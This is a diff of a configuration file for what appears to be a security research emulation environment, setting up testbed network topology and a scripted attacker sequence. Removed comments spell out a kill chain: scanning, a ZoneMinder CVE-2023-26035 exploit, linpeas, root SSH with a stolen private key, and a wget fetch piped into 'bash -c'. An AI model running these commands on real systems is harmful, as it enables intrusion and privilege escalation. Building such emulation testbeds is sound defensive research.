@@ -81,7 +81,7 @@ def default_config(name: str, network_id: int = 17, level: int = 17, version: st
     kafka_cfg = default_kafka_config(network_id=network_id, level=level, version=version,
                                      time_step_len_seconds=time_step_len_seconds)
     services_cfg = default_services_config(network_id=network_id)
-    descr = "An emulation environment. SL001-risk mission with a set of nodes that run common networked services " \
+    descr = "An emulation environment. SL700-risk mission with a set of nodes that run common networked services " \
             "such as SSH, Kafka," \
             " etc. Some of the services are vulnerable to simple dictionary attacks as " \
             "they use weak passwords." \
@@ -1101,8 +1101,7 @@ def default_topology_config(network_id: int) -> TopologyConfig:
                             input_accept=set([]),
                             forward_accept=set(), output_drop=set(), input_drop=set(), forward_drop=set(),
                             routes=set())
-
-    # !! Change to WebCam    
+    
     node_22 = NodeFirewallConfig(hostname=f"{constants.CONTAINER_IMAGES.RTSP_CAM}_22",
                                 ips_gw_default_policy_networks=[
                                     DefaultNetworkFirewallConfig(
@@ -1280,7 +1279,7 @@ def default_topology_config(network_id: int) -> TopologyConfig:
                                   f"{constants.CSLE.CSLE_SUBNETMASK_PREFIX}"
                                   f"{network_id}.1{constants.CSLE.CSLE_EDGE_SUBNETMASK_SUFFIX}",
                                   f"{constants.CSLE.CSLE_SUBNETMASK_PREFIX}"
-                                  f"{network_id}.2{constants.CSLE.CSLE_EDGE_SUBNETMASK_SUFFIX}"
+                                  f"{network_id}.2{constants.CSLE.CSLE_EDGE_SUBNETMASK_SUFFIX}",
                                   f"{constants.CSLE.CSLE_SUBNETMASK_PREFIX}"
                                   f"{network_id}.3{constants.CSLE.CSLE_EDGE_SUBNETMASK_SUFFIX}",
                                   f"{constants.CSLE.CSLE_SUBNETMASK_PREFIX}"
@@ -1681,48 +1680,17 @@ def default_static_attacker_sequences(subnet_masks: List[str]) -> Dict[str, List
     d[constants.STATIC_ATTACKERS.EXPERT] = [
         EmulationAttackerShellActions.INSTALL_TOOLS(index=-1),
 
-        # DNSENUM on Corp DNS
-        # dnsenum -f /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --dnsserver 15.17.1.13 aecid-testbed.com
-
         EmulationAttackerShellActions.DNSENUM(index=-1),
 
-
-        # sudo nmap -O -sT --top-ports 100 192.42.0.254
-        # ? Who should we NMAP??
         EmulationAttackerNMAPActions.TCP_CON_NON_STEALTH_SCAN(index=-1, ips=subnet_masks),
 
-        # nikto -host 192.42.0.254
         EmulationAttackerNIKTOActions.NIKTO_WEB_HOST_SCAN(index=-1, ips=subnet_masks),
 
-        # ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://15.17.2.21/FUZZ
         EmulationAttackerShellActions.FFUF(index=-1),
 
-        # exploit/unix/webapp/zoneminder_snapshots
-        # cd /tmp
-        # upload /var/www/html/linpeas.sh
         EmulationAttackerShellActions.CVE_2023_26035_EXPLOIT(index=-1),
-
-        # ? We don't need this right?
-        # shell
-        # python3 -c "import pty;pty.spawn(\"/bin/bash\")";
-        # export SHELL=bash
-        # export TERM=xterm256-color
-        # stty rows 38 columns 116
-        # export PS1="PWN >"
-
-        # chmod +x linpeas.sh
-        # ./linpeas.sh -s -q -N 2> /dev/null
-
-        # id
-        # find /home -ls
-        # ssh -i /home/webdev/.ssh/id_rsa -o "StrictHostKeyChecking no" root@localhost
-
-        # id
-        # cd /root; wget http://15.17.1.191/README.txt
-        # split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
-
-        # exit
-        # rm linpeas.sh
+        
+        EmulationAttackerShellActions.ROOT_COMMANDS2(index=-1)
         # exit
         # id
         # pwd
